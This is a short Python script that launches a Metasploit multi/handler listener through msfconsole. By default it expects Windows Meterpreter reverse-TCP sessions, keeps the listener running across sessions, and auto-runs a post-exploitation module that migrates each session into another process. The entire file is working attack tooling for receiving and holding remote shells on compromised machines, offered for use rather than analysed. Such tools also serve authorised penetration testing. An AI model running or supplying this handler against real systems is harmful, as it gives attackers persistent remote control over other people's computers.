#!/usr/bin/env python
#
# Python script for starting a Meterpreter handler
#
# Author: Oleg Mitrofanov, 2015
#
# Inspired by StartListener.py by Chris Campbell of obscuresec
#
# The script uses -x option of msfconsole by default, but can also use
# the -r option supplying a temporary resource file. Be aware that 
# currently (2015 Apr 1) there is a race condition bug associated with 
# -r and  -x flags that sometimes leads to errors --
# https://github.com/rapid7/metasploit-framework/issues/4340
# If you get the following or other error --
# [-] Exploit failed: undefined method `const_defined?' for nil:NilClass
# -- then try finishing the procedure by running the exploit with run -j


import argparse 
import os
import subprocess
import sys
import tempfile

def print_info(host, port, payload):
    RESET = "\033[0m"
    BLUE = "\033[1;34m"
    BOLD = "\033[1m"

    print(BOLD + BLUE + "[*]" + RESET + " Starting listener on " +
        "{}:{} for {} payload...".format(host, port, payload))


parser = argparse.ArgumentParser(
    description="Start a local persistent (ExitOnSession => false) listener "
        "for reverse or connect to remote for bind Metasploit payloads."
)
parser.add_argument("host", default="0.0.0.0", nargs="?",
    help="Local IP address to listen on. Defaults to 0.0.0.0")
parser.add_argument("-p", default="4444", metavar="port", 
    help="Local port number. Defaults to 4444")
parser.add_argument("-P", default="windows/meterpreter/reverse_tcp", 
    metavar="payload", help="Metasploit payload to expect. Defaults to "
    "windows/meterpreter/reverse_tcp")
parser.add_argument("-r", action="store_true", help="Pass msfconsole a "
    "resource file using -r instead of -x option")

args = parser.parse_args()

host = args.host
port = args.p
payload = args.P
res_file = args.r

# Delimit with \n for -r switch or with ; for -x switch
delimeter = "\n" if res_file else "; "

# Determine what variable to set: LHOST if reverse payload or RHOST if
# bind
host_var  = "RHOST" if "bind" in payload else "LHOST"

msfconsole_commands = delimeter.join([
    "use exploit/multi/handler",
    "set PAYLOAD " + payload,
    "set " + host_var + " " + host,
    "set LPORT " + port,
    "set ExitOnSession false",
    "set AutoRunScript post/windows/manage/smart_migrate",
    "exploit -j"
])

print_info(host, port, payload)

if res_file:
    tmp_fhandle, tmp_fname = tempfile.mkstemp(text=True)
    os.write(tmp_fhandle, msfconsole_commands)
    os.close(tmp_fhandle)
    shell_command = 'msfconsole -q -r "{}"'.format(tmp_fname)
    subprocess.call(shell_command, shell=True)
    os.remove(tmp_fname)
else:
    shell_command = 'msfconsole -q -x "{}"'.format(msfconsole_commands)
    subprocess.call(shell_command, shell=True)
